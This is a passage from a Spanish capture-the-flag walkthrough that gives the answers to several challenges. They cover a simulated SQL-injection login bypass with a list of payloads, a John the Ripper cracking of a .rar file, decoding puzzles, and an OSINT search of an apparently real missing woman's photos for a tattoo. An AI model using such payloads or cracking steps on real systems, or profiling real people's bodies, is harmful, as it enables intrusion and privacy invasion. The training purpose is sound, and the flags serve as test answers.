<p>En el código fuente de la página privado.html nos encontramos este
mensaje:</p>
<p>&lt;!--</p>
<p>🐔</p>
<p>ᒧᒬᒷᒥᒪᒧ ᐯ⩀ᒷᒥ ᒧᒷ ⊏⪽⟔⪾ᐸᒷᒧ⟔ᒥ⪽ ⊐☐ ☐ᐯᐳᒧ ᒬᒧᒣᒥ🝕ᒧ ᒬᒧ⟔ᒧ ☐🝕ᒪ⪽🝕ᐳ⟔ᒧ⟔ ᒷᒧ ⪾⪽ᐯᒪᒧ
4</p>
<p>--&gt;</p>
<p><img src="cookbook/media/image49.png"
style="width:6.22637in;height:0.75in" /></p>
<p>Este mensaje tiene un cifrado Pigpen.</p>
<p>El Cifrado Pigpen, también conocido como cifrado masónico o de los
francmasones, es un cifrado de sustitución monoalfabética que se basa en
la representación visual de las letras del alfabeto mediante fragmentos
de una cuadrícula o "corrales de cerdos" (de ahí su nombre, "pigpen" en
inglés significa chiquero o pocilga). Es un método de cifrado simple y
visualmente distintivo.</p>
<p><strong>¿Cómo Funciona?</strong></p>
<p>El principio fundamental del cifrado Pigpen es que cada letra se
sustituye por el fragmento de la rejilla que la contiene. Para ello, se
utilizan típicamente dos rejillas principales y dos rejillas en forma de
'X', cada una dividida para contener una serie de letras. Algunas letras
se distinguen añadiendo un punto dentro de su símbolo.</p>
<p>Aquí están las configuraciones más comunes de las rejillas:</p>
<p>1. Rejillas Cuadradas (Grid)</p>
<p>Se dividen en nueve celdas cada una, como un "tres en raya".</p>
<p>Primera Rejilla (sin punto): Contiene las primeras letras del
alfabeto.</p>
<p>┌───┬───┬───┐</p>
<p>│ A │ B │ C │</p>
<p>├───┼───┼───┤</p>
<p>│ D │ E │ F │</p>
<p>├───┼───┼───┤</p>
<p>│ G │ H │ I │</p>
<p>└───┴───┴───┘</p>
<p>Ejemplo: La letra 'A' se representa con la esquina superior izquierda
de la cuadrícula. La 'E' se representa con el cuadrado completo sin
lados externos. La 'H' se representa con la parte inferior de la
cuadrícula.</p>
<p>Segunda Rejilla (con un punto): Contiene las siguientes letras, y los
símbolos resultantes llevan un punto.</p>
<p>┌───┬───┬───┐</p>
<p>│ J•│ K•│ L•│</p>
<p>├───┼───┼───┤</p>
<p>│ M•│ N•│ O•│</p>
<p>├───┼───┼───┤</p>
<p>│ P•│ Q•│ R•│</p>
<p>└───┴───┴───┘</p>
<p>Ejemplo: La letra 'J' se representa con la esquina superior izquierda
con un punto. La 'N' se representa con el cuadrado completo con un
punto.</p>
<p>2. Rejillas en Cruz (X-Grid o Tic-Tac-Toe Diagonal)</p>
<p>Se forman con líneas diagonales que crean cuatro "brazos" o "picos"
en cada rejilla.</p>
<p>Primera Rejilla X (sin punto):</p>
<p>╲ A'╱</p>
<p>╳</p>
<p>╱ B'╲</p>
<p>Aquí, las letras se colocan en los "brazos" que se forman. Por
ejemplo, la 'S' (o a veces 'U' o 'T' dependiendo de la variante) podría
ser el símbolo que representa la 'V' inclinada hacia la derecha.</p>
<p>Segunda Rejilla X (con un punto): Similar a la anterior, pero los
símbolos llevan un punto.</p>
<p>╲ C'•╱</p>
<p>╳</p>
<p>╱ D'•╲</p>
<p><strong>Variantes</strong></p>
<p>Es importante destacar que existen varias variantes del cifrado
Pigpen. La asignación de letras a los "corrales" puede cambiar, y el
orden de las letras en las rejillas en 'X' a veces difiere.</p>
<p>Por lo tanto, para descifrar un mensaje Pigpen, es crucial conocer la
clave o la plantilla exacta utilizada por el emisor.</p>
<p><strong>Características</strong></p>
<p>• Simple de usar: Una vez que se conoce la clave, la codificación y
decodificación son directas.</p>
<p>• Visualmente distintivo: Los símbolos resultantes son únicos y no se
parecen a las letras del alfabeto latino, lo que lo hace parecer
"secreto" a primera vista.</p>
<p>• No ofrece gran seguridad: Es un cifrado muy fácil de romper
mediante el análisis de frecuencia si el texto es lo suficientemente
largo, o simplemente probando las variantes conocidas del alfabeto
Pigpen.</p>
<p>• Histórico: Se hizo popular entre los francmasones en el siglo XVIII
para proteger documentos de su orden, aunque su origen podría ser
anterior.</p>
<p>En resumen, el cifrado Pigpen es un método divertido y visualmente
interesante para ocultar mensajes, pero su simplicidad lo hace más
adecuado para acertijos o juegos que para una seguridad de comunicación
robusta.</p>
<p><a
href="https://www.dcode.fr/cifrado-pigpen">https://www.dcode.fr/cifrado-pigpen</a></p>
<p>El texto sin encriptar dice:</p>
<p>&lt;!--</p>
<p>🐔</p>
<p>Aplica SQLi al formulario de esta pagina para encontrar la mosca
4</p>
<p>--&gt;</p>
<p><span id="_Toc207189826" class="anchor"></span><strong>🌐 Acceso
inicial</strong></p>
<p>http://192.168.1.44/privado.html</p>
<p>En esta página hay un formulario de acceso privado con dos
campos:</p>
<ul>
<li><p>Usuario</p></li>
<li><p>Contraseña</p></li>
</ul>
<p><img src="cookbook/media/image50.png"
style="width:4.96042in;height:3.86667in" /></p>
<p>La acción del formulario apunta a:</p>
<p><strong>validar.php</strong></p>
<p>Este archivo procesa el POST de los campos usuario y clave.</p>
<p><span id="_Toc207189827" class="anchor"></span><strong>🔎
Comportamiento del formulario</strong></p>
<ol type="1">
<li><p>Introducir credenciales válidas muestra un mensaje de acceso
concedido.</p></li>
<li><p>Credenciales incorrectas generan un alert("Acceso
denegado").</p></li>
</ol>
<p>El formulario simula que si el usuario introduce una cadena que
parece una inyección SQL (por ejemplo ' OR '1'='1), el sistema muestra
acceso concedido con el nombre del personaje Mike Ehrmantraut, como si
hubiera “hackeado” la entrada.</p>
<p><strong>validar.php</strong></p>
<p>&lt;?php</p>
<p>$usuario = $_POST['usuario'];</p>
<p>$clave = $_POST['clave']; // dejamos el caso original sin forzar
lowercase</p>
<p>// Simulación de patrón típico de SQL Injection</p>
<p>$patrones_inyeccion = [</p>
<p>"' OR '1'='1",</p>
<p>"' or '1'='1",</p>
<p>"' OR 1=1 --",</p>
<p>"' or 1=1 --",</p>
<p>"' OR 1=1 #",</p>
<p>"' OR TRUE --",</p>
<p>"'='"</p>
<p>];</p>
<p>// Comprobamos si la cadena ingresada coincide con algún patrón
típico</p>
<p>foreach ($patrones_inyeccion as $patron) {</p>
<p>if (stripos($clave, $patron) !== false) {</p>
<p>// Simulamos acceso exitoso como si la inyección hubiera
funcionado</p>
<p>echo "</p>
<p>&lt;!DOCTYPE html&gt;</p>
<p>&lt;html lang='es'&gt;</p>
<p>&lt;head&gt;</p>
<p>&lt;meta charset='UTF-8'&gt;</p>
<p>&lt;title&gt;Acceso concedido&lt;/title&gt;</p>
<p>&lt;style&gt;</p>
<p>body {</p>
<p>background-color: #fef8e7;</p>
<p>font-family: 'Arial Black', Impact, sans-serif;</p>
<p>display: flex;</p>
<p>align-items: center;</p>
<p>justify-content: center;</p>
<p>height: 100vh;</p>
<p>}</p>
<p>.mensaje {</p>
<p>background-color: #d4edda;</p>
<p>border: 2px solid #155724;</p>
<p>padding: 40px;</p>
<p>border-radius: 15px;</p>
<p>text-align: center;</p>
<p>color: #155724;</p>
<p>font-size: 24px;</p>
<p>box-shadow: 0 0 10px rgba(0,0,0,0.2);</p>
<p>}</p>
<p>&lt;/style&gt;</p>
<p>&lt;/head&gt;</p>
<p>&lt;body&gt;</p>
<p>&lt;div class='mensaje'&gt;</p>
<p>✅ Acceso concedido&lt;br&gt;&lt;br&gt;</p>
<p>&lt;strong&gt;¡Bienvenido,
Mike_Ehrmantraut!&lt;/strong&gt;&lt;br&gt;</p>
<p>&lt;strong&gt;Flag:&lt;/strong&gt; Mike_Ehrmantraut</p>
<p>&lt;/div&gt;</p>
<p>&lt;/body&gt;</p>
<p>&lt;/html&gt;</p>
<p>";</p>
<p>exit;</p>
<p>}</p>
<p>}</p>
<p>// Si no se detectó inyección</p>
<p>echo "&lt;script&gt;alert('Acceso denegado.');
window.history.back();&lt;/script&gt;";</p>
<p>?&gt;</p>
<p><span id="_Toc207189828" class="anchor"></span><strong>🔍 Análisis de
vulnerabilidad</strong></p>
<p>El formulario no valida el contenido del campo clave de forma segura.
Internamente, el script compara el valor ingresado contra una serie de
patrones conocidos de inyección SQL, como:</p>
<ul>
<li><p>' OR '1'='1</p></li>
<li><p>' OR TRUE --</p></li>
<li><p>'='</p></li>
</ul>
<p>Si alguno de estos aparece en la cadena de entrada, se simula un
bypass y se concede acceso.</p>
<p><span id="_Toc207189829" class="anchor"></span><strong>🧪 Ejecución
de la inyección</strong></p>
<p>En el formulario:</p>
<ul>
<li><p>Usuario: cualquier valor (admin, test, vacío)</p></li>
<li><p>Contraseña: ' OR '1'='1</p></li>
</ul>
<p>⚠️ Es importante escribirlo <strong>exactamente</strong> así, con
espacios y comillas simples:</p>
<p>' OR '1'='1</p>
<p>Las comillas y los espacios deben estar intactos, ya que el sistema
realiza una comparación con patrones precisos (stripos), no expresiones
regulares ni sanitización avanzada.</p>
<p><span id="_Toc207189830" class="anchor"></span><strong>✅ Resultado
esperado</strong></p>
<p>Tras enviar los datos, el servidor responde con una página distinta
que contiene:</p>
<p>✅ Acceso concedido</p>
<p>¡Bienvenido, Mike_Ehrmantraut!</p>
<p>Flag: MIKE_EHRMANTRAUT</p>
<p>Esto representa la <strong>captura de la Mosca 4</strong>.</p>
<p><img src="cookbook/media/image51.png"
style="width:5.38323in;height:2.86458in" /></p>
<p><span id="_Toc207189831" class="anchor"></span><strong>🧠
Razonamiento técnico</strong></p>
<ul>
<li><p>No se requiere acceso a base de datos real.</p></li>
<li><p>El sistema simula el comportamiento de una inyección SQL
utilizando coincidencias estáticas.</p></li>
<li><p>Este reto educa en patrones clásicos de SQLi y en la importancia
del escaping y la validación del lado servidor.</p></li>
</ul>
<p><span id="_Toc207189832" class="anchor"></span><strong>🐝 Resultado
final</strong></p>
<p><mark>Mosca 4 atrapada: 'MIKE_EHRMANTRAUT'</mark></p>
<p>El jugador puede registrarla en el sistema central o apuntarla
manualmente según el entorno del CTF.</p>
<p><strong><br />
</strong></p>
<h1
id="mosca-5-crackeo-de-contraseña-de-archivo-protegido-.rar"><strong>🐝
Mosca 5 – Crackeo de Contraseña de Archivo Protegido
(.rar)</strong></h1>
<p><strong>Categoría:</strong> Cripto / Fuerza bruta simulada<br />
<strong>Nivel:</strong> Intermedio<br />
<strong>Mosca capturada:</strong> Jesse_Pinkman</p>
<p><span id="_Toc207189834" class="anchor"></span><strong>🧰
Herramientas necesarias</strong></p>
<ul>
<li><p>John the Ripper</p></li>
<li><p>Terminal Linux / macOS (o Windows con WSL)</p></li>
<li><p>Archivos del reto: algo.rar y passwords.txt</p></li>
</ul>
<p><span id="_Toc207189835" class="anchor"></span><strong>📁 Contenido
inicial</strong></p>
<p>Dentro de la carpeta “archivos” del entorno web hay dos archivos:</p>
<ul>
<li><p>algo.rar: archivo comprimido protegido por contraseña</p></li>
<li><p>passwords.txt: contiene una lista de 200 posibles
contraseñas</p></li>
</ul>
<p><span id="_Toc207189836" class="anchor"></span><strong>🧠 Enunciado
oculto</strong></p>
<p>En el código fuente de privado.html aparece una pista con estilo
narco-retorcido. Se indica que hay un archivo testarudo que no se abre
sin la clave correcta, y que “John” sabe destripar secretos:</p>
<p>&lt;!--</p>
<p>🐔</p>
<p>Ajúa, valedor...</p>
<p>En esta carpeta hay un algo bien testarudo que no se deja abrir nomás
porque sí.</p>
<p>Hay también una lista con 200 posibles llaves… pero solo una hace que
el candado truene.</p>
<p>Si quieres saber qué se esconde ahí dentro, tendrás que ponerte
trucha.</p>
<p>Pide ayuda a John, ese que es bueno pa' destripar secretos...</p>
<p>Usa la lista con maña y ve probando. Si das con la clave buena, algo
saldrá.</p>
<p>¿Tendrás lo que se necesita pa’ sacar algo de su escondite?</p>
<p>--&gt;</p>
<p>Esto nos lleva directamente al uso de la herramienta <strong>John the
Ripper</strong>, que incluye funciones para crackear archivos .rar
protegidos.</p>
<p>Veamos el paso a paso para usar John the Ripper y descubrir cuál de
las contraseñas del archivo passwords.txt abre el archivo algo.rar.</p>
<p>Archivos:</p>
<ul>
<li><p>algo.rar → archivo protegido</p></li>
<li><p>passwords.txt → lista de +200 contraseñas posibles</p></li>
</ul>
<p><span id="_Toc207189837" class="anchor"></span><strong>🧪
Procedimiento paso a paso</strong></p>
<p><strong>1. Extraer el hash del archivo .rar</strong></p>
<p>Usamos el módulo rar2john para convertir el archivo comprimido en un
hash legible por John:</p>
<p>rar2john algo.rar &gt; rar_hash.txt</p>
<p><img src="cookbook/media/image52.png"
style="width:4.55208in;height:1.55208in" /></p>
<p>Esto genera un archivo rar_hash.txt con la firma hash del archivo
comprimido.</p>
<p><strong>2. Ejecutar el cracking con diccionario</strong></p>
<p>Ahora lanzamos John usando la lista de contraseñas:</p>
<p>john --wordlist=passwords.txt rar_hash.txt</p>
<p><img src="cookbook/media/image53.png"
style="width:5.90556in;height:1.45764in" /></p>
<p>Este comando empieza a probar todas las combinaciones de
passwords.txt contra el hash generado del archivo .rar.</p>
<p><strong>3. Ver la contraseña encontrada</strong></p>
<p>Una vez terminado el proceso, verificamos cuál fue la clave con:</p>
<p>john --show rar_hash.txt</p>
<p><img src="cookbook/media/image54.png"
style="width:3.58333in;height:1in" /></p>
<p><span id="_Toc207189838" class="anchor"></span><strong>🧩
Resultado</strong></p>
<p>John revela que la contraseña correcta para descomprimir algo.rar
es:</p>
<p>mW5#nC4!vE</p>
<p>Al usar esta clave con cualquier programa de descompresión (7-Zip,
WinRAR, etc.), el archivo se desbloquea y encontramos la <strong>Mosca
5</strong>:</p>
<p><img src="cookbook/media/image55.png"
style="width:2.58333in;height:1.13542in" /></p>
<p><mark>Mosca 5 atrapada: 'Jesse_Pinkman'</mark></p>
<p><span id="_Toc207189839" class="anchor"></span><strong>🧠
Razonamiento técnico</strong></p>
<ul>
<li><p>El reto demuestra un uso realista y práctico de cracking de
contraseñas mediante diccionario.</p></li>
<li><p>Se plantea una simulación controlada del proceso de fuerza bruta
usando herramientas especializadas.</p></li>
<li><p>El reto es educativo sobre seguridad y cifrado en archivos
.rar.</p></li>
</ul>
<p><strong><br />
</strong></p>
<h1 id="mosca-6-descompresión-braille-oculto-en-imagen"><strong>🐝 Mosca
6 – Descompresión + Braille oculto en imagen</strong></h1>
<p><strong>Categoría:</strong> Esteganografía / OCR / Cripto
visual<br />
<strong>Nivel:</strong> Intermedio<br />
<strong>Mosca capturada:</strong> Metanfetamina</p>
<p><span id="_Toc207189841" class="anchor"></span><strong>📁 Contenido
de la carpeta</strong></p>
<ul>
<li><p>PIN.png: imagen simulando calor por contacto (efecto térmico de
pantalla)</p></li>
<li><p>PAN.rar: archivo comprimido protegido por contraseña</p></li>
</ul>
<p><span id="_Toc207189842" class="anchor"></span><strong>🔎 Análisis de
la pista</strong></p>
<p>En el código fuente de menu.html, se encuentra una rima en estilo
corrido mexicano:</p>
<p>&lt;!—</p>
<p>🐔</p>
<p>"Entre el PIN y el PAN hay maña y no desayuno,</p>
<p>uno se ve bonito, pero trae truco alguno.</p>
<p>El PIN, que parece inocente retrato,</p>
<p>esconde en sus píxeles un dato muy sensato.</p>
<p>No lo mires nomás, échale ojo de aguililla,</p>
<p>que la clave pa’ abrir el PAN está bien escondidilla.</p>
<p>Y el PAN, tan calladito, no suelta su manjar,</p>
<p>si no le das la clave que el PIN te va a soltar.</p>
<p>Así que ponte trucha, no te vayas a confiar,</p>
<p>que del PIN sale la clave… ¡y el PAN te va a alimentar!"</p>
<p>--&gt;</p>
<p>Esto sugiere que:</p>
<ul>
<li><p>La <strong>clave</strong> para abrir PAN.rar está en
PIN.png</p></li>
<li><p>El <strong>contenido oculto</strong> del archivo comprimido es la
Mosca 6</p></li>
</ul>
<p><span id="_Toc207189843" class="anchor"></span><strong>🧪 Paso a paso
técnico</strong></p>
<p><strong>1. Identificar el PIN térmico</strong></p>
<p>Este mensaje nos lleva a la carpeta archivos donde tenemos PIN.png y
PAN.rar. La imagen PIN.png simula una pantalla con efecto térmico. Al
observar la intensidad del color en cada dígito, se deduce la secuencia
más reciente pulsada (más roja, más reciente).</p>
<p><img src="cookbook/media/image56.png"
style="width:3.58056in;height:3.58056in" /></p>
<p>Resultado observado:</p>
<p>PIN = 9348</p>
<p><strong>2. Descomprimir PAN.rar con el PIN como clave</strong></p>
<p>Usamos 7-Zip, WinRAR o terminal para intentar descomprimir con
contraseña:</p>
<p>unrar x PAN.rar</p>
<p>Cuando solicita clave, ingresamos:</p>
<p>9348</p>
<p>El archivo se descomprime correctamente, revelando:</p>
<p>PAN.txt: contiene un mensaje en Braille Unicode</p>
<p><img src="cookbook/media/image57.png"
style="width:3.58056in;height:1.42708in" /></p>
<p><strong>3. Interpretación del Braille</strong></p>
<p>Contenido de PAN.txt:</p>
<p>⠍⠑⠞⠁⠝⠋⠑⠞⠁⠍⠊⠝⠁</p>
<p>Esto es Braille Unicode. Vamos a probar a descifrarlo con alguno de
los servicios que hay online.</p>
<p>Utilizamos traductores como:</p>
<p><a
href="https://openl.io/es/translate/braille">https://openl.io/es/translate/braille</a></p>
<p><a
href="https://www.brailletranslator.org/es.html">https://www.brailletranslator.org/es.html</a></p>
<p><a
href="https://www.brailletranslator.org/es.html">https://www.brailletranslator.org/es.html</a></p>
<p><a
href="https://www.braillecaster.net/">https://www.braillecaster.net/</a></p>
<blockquote>
<p><img src="cookbook/media/image58.png"
style="width:4.98958in;height:1.05294in" /></p>
<p><img src="cookbook/media/image59.png"
style="width:4.86108in;height:2.97917in" /></p>
</blockquote>
<p>El texto ⠍⠑⠞⠁⠝⠋⠑⠞⠁⠍⠊⠝⠁ significa Metanfetamina</p>
<p><span id="_Toc207189844" class="anchor"></span><strong>🐞 Resultado
final</strong></p>
<p><mark>Mosca 6 atrapada: 'Metanfetamina'</mark></p>
<p><span id="_Toc207189845" class="anchor"></span><strong>🧠
Razonamiento técnico</strong></p>
<ul>
<li><p>La pista se presenta en forma de acertijo poético para
identificar el orden de pulsación.</p></li>
<li><p>Se introduce el concepto de esteganografía visual, cifrado
Braille y extracción de contraseñas no convencionales.</p></li>
<li><p>Enfrenta al jugador con la interpretación de códigos no
textuales—ideal para retos tipo CTF que mezclan lo digital con lo
analógico.</p></li>
</ul>
<p><strong><br />
</strong></p>
<h1 id="mosca-7-md5-de-imagen-jpeg"><strong>🐝 Mosca 7 – MD5 de Imagen
JPEG</strong></h1>
<p><strong>Categoría:</strong> Cripto / Hash / Ingeniería Digital<br />
<strong>Nivel:</strong> Básico<br />
<strong>Mosca capturada:</strong> 27303a04ee484427ca5b3eb482772f3f</p>
<p><span id="_Toc207189847" class="anchor"></span><strong>🧰
Herramientas necesarias</strong></p>
<ul>
<li><p>Navegador o editor HTML para leer código fuente</p></li>
<li><p>Imagen menu6.jpg</p></li>
<li><p>Generador de hash MD5 (puede ser web o desde terminal)</p></li>
</ul>
<p><span id="_Toc207189848" class="anchor"></span><strong>📜 Pista
inicial</strong></p>
<p>En el código fuente de la página menu.html encontramos el siguiente
código:</p>
<p>&lt;!—</p>
<p>🐔</p>
<p>105 154 40 150 141 163 150 40 115 104 65 40 144 145 40 154 141 40 151
155 141 147 145 156 40 144 145 154 40 155 145 156 165 40 66 40 145 163
40 154 141 40 155 157 163 143 141 40 67</p>
<p>--&gt;</p>
<p>A simple vista, este código podría ser Octal ya que no hay ningún 8
ni ningún 9.</p>
<p><strong>¿Qué es octal?</strong></p>
<p>El sistema octal usa base 8 (dígitos del 0 al 7). Cada número
representa un valor que puede convertirse a decimal, y luego a un
carácter según el código ASCII.</p>
<p><strong>Procedimiento para decodificar:</strong></p>
<p>1. Interpretar cada número como octal.</p>
<p>2. Convertir a decimal.</p>
<p>3. Convertir el decimal a carácter ASCII.</p>
<p><strong>Ejemplo con los primeros valores:</strong></p>
<p>105 (octal) → 1×64 + 0×8 + 5 = 69 → 'E'</p>
<p>154 (octal) → 1×64 + 5×8 + 4 = 108 → 'l'</p>
<p>40 (octal) → 4×8 + 0 = 32 → espacio ' '</p>
<p>150 (octal) → 1×64 + 5×8 + 0 = 104 → 'h'</p>
<p>141 (octal) → 1×64 + 4×8 + 1 = 97 → 'a'</p>
<p>163 (octal) → 1×64 + 6×8 + 3 = 115 → 's'</p>
<p>150 (octal) → 104 → 'h'</p>
<p><strong>Hasta aquí ya tenemos:</strong></p>
<p>105 154 40 150 141 163 150</p>
<p>↓</p>
<p>E l ␣ h a s h</p>
<p>Podemos usar alguno de los servicios online para traducirlo:</p>
<p><a
href="https://photo333.com/text-to-octal-es.php">https://photo333.com/text-to-octal-es.php</a></p>
<p><a
href="https://seostudio.tools/es/text-to-octal">https://seostudio.tools/es/text-to-octal</a></p>
<p><img src="cookbook/media/image60.png"
style="width:5.90694in;height:2.26042in" /></p>
<p>Esto nos revela el siguiente texto::</p>
<p>&lt;!--</p>
<p>🐔</p>
<p>El hash MD5 de la imagen del menu 6 es la mosca 7</p>
<p>--&gt;</p>
<p>Según esto debemos sacar el hash MD5 de la imagen menu6.jpg que está
en la carpeta archivos:</p>
<p><img src="cookbook/media/image61.jpg"
style="width:2.35417in;height:2.59206in" /></p>
<p>El hash MD5 de la imagen del menú 6 es la Mosca 7</p>
<p>Esto nos indica que debemos calcular el hash MD5 de menu6.jpg.</p>
<p><span id="_Toc207189849" class="anchor"></span><strong>🧪
Procedimiento técnico</strong></p>
<p><strong>1. Acceder al archivo menu6.jpg</strong></p>
<p>Asegúrate de tener acceso local a la imagen en la carpeta de archivos
del CTF.</p>
<p><strong>2. Calcular el hash MD5</strong></p>
<p>Puedes hacerlo de dos maneras:</p>
<p><strong>🔧 Desde terminal (Linux/macOS)</strong></p>
<p>md5sum menu6.jpg</p>
<p><strong>🔧 Desde PowerShell (Windows)</strong></p>
<p>Get-FileHash .\menu6.jpg -Algorithm MD5</p>
<p><strong>🌐 Desde sitio web online</strong></p>
<p>Para calcular el hash MD5 de una imagen online, puedes utilizar
herramientas como:</p>
<p>online-convert.com</p>
<p>hash.online-convert.com</p>
<p><a
href="https://hash.online-convert.com/es/generador-md5">https://hash.online-convert.com/es/generador-md5</a></p>
<p><a
href="https://emn178.github.io/online-tools/md5_checksum.html">https://emn178.github.io/online-tools/md5_checksum.html</a></p>
<p>Estas herramientas te permiten subir la imagen y generar su hash MD5,
que es una cadena única de 32 caracteres hexadecimales.</p>
<p><img src="cookbook/media/image62.png"
style="width:4.29604in;height:2.52589in" /></p>
<p><img src="cookbook/media/image63.png"
style="width:5.41802in;height:2.73958in" /></p>
<p><strong>3. Resultado</strong></p>
<p>El hash MD5 obtenido para menu6.jpg es:</p>
<p>27303a04ee484427ca5b3eb482772f3f</p>
<p><span id="_Toc207189850" class="anchor"></span><strong>🐞 Resultado
final</strong></p>
<p><mark>Mosca 7 atrapada: '27303a04ee484427ca5b3eb482772f3f'</mark></p>
<p><span id="_Toc207189851" class="anchor"></span><strong>🧠
Razonamiento técnico</strong></p>
<ul>
<li><p>Este reto introduce la noción de “huella digital” de
archivos.</p></li>
<li><p>Refuerza el concepto de unicidad de los archivos a través de su
hash.</p></li>
<li><p>Enseña cómo verificar la integridad y autenticidad sin abrir el
contenido.</p></li>
</ul>
<p><strong><br />
</strong></p>
<h1 id="mosca-8-investigación-de-persona-desaparecida"><strong>🐝 Mosca
8 – Investigación de Persona Desaparecida</strong></h1>
<p><strong>Categoría:</strong> OSINT / Esteganografía / Base64<br />
<strong>Nivel:</strong> Intermedio-Avanzado<br />
<strong>Mosca capturada:</strong> Ferriera</p>
<p><span id="_Toc207189853" class="anchor"></span><strong>🧰
Herramientas necesarias</strong></p>
<ul>
<li><p>Decodificador Base64</p></li>
<li><p>Buscadores inversos de imagen (Google, TinEye)</p></li>
<li><p>Navegador web para investigación</p></li>
<li><p>Sentido detective 🕵️‍♂️</p></li>
</ul>
<p><span id="_Toc207189854" class="anchor"></span><strong>🧪
Procedimiento técnico</strong></p>
<p><strong>1. Descifrar la pista codificada</strong></p>
<p>En el código fuente de localización.html encontramos un texto:</p>
<p>&lt;!--</p>
<p>🐔</p>
<p>TGEgREVBIGJ1c2NhIGEgdW5hIGNoaWNhIGRlc2FwYXJlY2lkYS4gTGEgcGFsYWJyYSBxdWUgbGxldmEgdGF0dWFkYSBlbiBlbCBwZWNobyBkZXJlY2hvIGVzIGxhIE1vc2NhIDggICAgIA==</p>
<p>--&gt;</p>
<p>Esta cadena delata que está en formato Base64 por varias razones
técnicas muy claras:</p>
<p><strong>🔍 ¿Cómo se sabe que es Base64?</strong></p>
<p><strong>✅ 1.</strong> Conjunto de caracteres restringido</p>
<p>Base64 <strong>solo usa 64 caracteres válidos</strong>, además del
signo = como relleno opcional al final:</p>
<p>A–Z, a–z, 0–9, +, /</p>
<p>Y esta cadena solo contiene:</p>
<p>Letras mayúsculas y minúsculas</p>
<p>Números</p>
<p>El signo = al final (relleno típico de Base64)</p>
<p><strong>✅ 2.</strong> Longitud típica (múltiplo de 4)</p>
<p>Las cadenas Base64 <strong>siempre tienen una longitud múltiplo de
4</strong> caracteres, porque cada 3 bytes de datos se codifican como 4
caracteres Base64.</p>
<p>Esta cadena tiene <strong>104 caracteres</strong>, que es múltiplo de
4.</p>
<p><strong>✅ 3.</strong> Uso del signo <strong>=</strong> al final</p>
<p>En Base64, los signos = se usan como <strong>relleno
(padding)</strong> para alinear los bloques.</p>
<p>El final de esta cadena termina con ==, una pista muy fuerte de
codificación Base64.</p>
<p>✅ Conclusión</p>
<p><strong>Sabemos que la cadena está en Base64 por:</strong></p>
<table>
<colgroup>
<col style="width: 52%" />
<col style="width: 47%" />
</colgroup>
<thead>
<tr>
<th style="text-align: center;"><strong>Evidencia</strong></th>
<th style="text-align: center;"><strong>Explicación</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Solo usa letras, números, +, /, y =</td>
<td>Base64 solo permite ese conjunto</td>
</tr>
<tr>
<td>Longitud múltiplo de 4</td>
<td>Requisito del formato Base64</td>
</tr>
<tr>
<td>Termina en ==</td>
<td>Padding típico de Base64</td>
</tr>
<tr>
<td>Al decodificar, es texto legible</td>
<td>Muy típico en mensajes ocultos</td>
</tr>
</tbody>
</table>
<p><strong>¿Qué es Base64?</strong></p>
<p>La codificación en Base64 es un método que permite representar datos
binarios (como imágenes, archivos, etc.) usando solo caracteres de texto
ASCII. Se utiliza comúnmente para transmitir datos por medios que solo
permiten texto, como correos electrónicos, JSON, o ciertos protocolos de
red.</p>
<p><strong>¿Por qué usar Base64?</strong></p>
<p>Muchos sistemas (como el correo electrónico o las URLs) solo permiten
caracteres de texto. Si se necesita enviar datos binarios (como una
imagen o un archivo PDF), hay que convertir esos datos en una forma
segura que pueda viajar sin corromperse: Base64 es una de esas
formas.</p>
<p><strong>¿Cómo funciona?</strong></p>
<ol type="1">
<li><p>Entrada binaria: Se toma el archivo o cadena original (en
binario).</p></li>
<li><p>Agrupación: Se divide el flujo binario en grupos de 3 bytes (24
bits).</p></li>
<li><p>División en bloques de 6 bits: Cada grupo de 24 bits se divide en
4 grupos de 6 bits.</p></li>
<li><p>Conversión: Cada grupo de 6 bits se convierte en un número entre
0 y 63, que luego se traduce a un carácter Base64 usando una tabla
estándar.</p></li>
<li><p>Relleno (Padding): Si el número total de bytes no es múltiplo de
3, se agregan caracteres = al final para completar la
codificación.</p></li>
</ol>
<p><strong>Ejemplo simple</strong></p>
<p>Supón que queremos codificar el texto: "Man"</p>
<ul>
<li><p>En ASCII: M = 77, a = 97, n = 110</p></li>
<li><p>En binario: 01001101 01100001 01101110 → 24 bits</p></li>
</ul>
<p>Dividimos en bloques de 6 bits:</p>
<p>010011 010110 000101 101110 → valores decimales: 19, 22, 5, 46</p>
<p>Con la tabla Base64, esto se convierte en:</p>
<p>TWFu</p>
<p><strong>Tabla Base64 estándar</strong></p>
<p>Base64 usa 64 caracteres:</p>
<p>A-Z (26) + a-z (26) + 0-9 (10) + '+' + '/'</p>
<p>Es decir, el conjunto completo es:</p>
<p>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</p>
<p><strong>Características clave</strong></p>
<ul>
<li><p>No es un método de cifrado ni de compresión.</p></li>
<li><p>Aumenta el tamaño de los datos en un ~33%.</p></li>
<li><p>Se usa en:</p></li>
</ul>
<ul>
<li><p>Correos electrónicos (MIME)</p></li>
<li><p>Codificación de imágenes en HTML
(data:image/png;base64,...)</p></li>
<li><p>Transmisión de tokens o contraseñas en HTTP (Authorization:
Basic)</p></li>
</ul>
<p><strong>Ventajas</strong></p>
<ul>
<li><p>Compatible con sistemas que solo aceptan texto.</p></li>
<li><p>Fácil de codificar/decodificar.</p></li>
</ul>
<p><strong>Desventajas</strong></p>
<ul>
<li><p>Aumenta el tamaño del archivo.</p></li>
<li><p>No es seguro por sí solo: los datos codificados pueden ser
fácilmente decodificados.</p></li>
</ul>
<p>Si utilizamos cualquier servicio online para descifrarlo veremos el
texto descodificado:</p>
<p><a
href="https://www.base64encode.org/es/">https://www.base64encode.org/es/</a></p>
<p><a
href="https://www.convertstring.com/es/EncodeDecode/Base64Decode">https://www.convertstring.com/es/EncodeDecode/Base64Decode</a></p>
<p>&lt;!--</p>
<p>🐔</p>
<p>La DEA busca a una chica desaparecida. La palabra que lleva tatuada
en el pecho derecho es la Mosca 8</p>
<p>--&gt;</p>
<p><strong>2. Analizar la imagen del reto</strong></p>
<p>En la carpeta de archivos hay una imagen llamada desaparecida.jpg.
Una búsqueda inversa con <strong>Google Imágenes</strong> revela que se
trata de <strong>Anastasia Karma Ferriera</strong>, una joven
desaparecida en el estado de Nuevo México.</p>
<p><img src="cookbook/media/image64.png"
style="width:5.76977in;height:3.67283in" /></p>
<p><strong>3. Investigación OSINT (Open Source
Intelligence)</strong></p>
<p>Una búsqueda más exhaustiva de los enlaces e imágenes nos lleva a
localizar varias fotos de Anastasia:</p>
<p><img src="cookbook/media/image65.png"
style="width:1.78681in;height:3.35347in" /><img
